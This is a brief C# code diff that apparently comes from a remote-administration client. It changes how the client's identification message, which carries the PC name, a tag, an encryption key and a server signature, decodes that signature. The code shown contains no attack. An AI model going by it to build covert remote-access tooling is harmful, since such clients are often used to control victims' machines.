@@ -12,7 +12,6 @@ using Ton618.Helper;
 using Ton618.IO;
 using Ton618.IpGeoLocation;
 using Q3C273.Shared.Messages.Client;
-using ByteEncodings;
 using System.Linq;
 
 namespace Ton618.Networking
@@ -148,7 +147,7 @@ namespace Ton618.Networking
                     PcName = SystemHelper.GetPcName(),
                     Tag = Settings.TAG,
                     EncryptionKey = Settings.ENCRYPTIONKEY,
-                    Signature = Alphabet.Base95Alphabet.GetBytes(Settings.SERVERSIGNATURE).ToArray()
+                    Signature = Qase64.Decode(Settings.SERVERSIGNATURE)
                 });
             }
         }
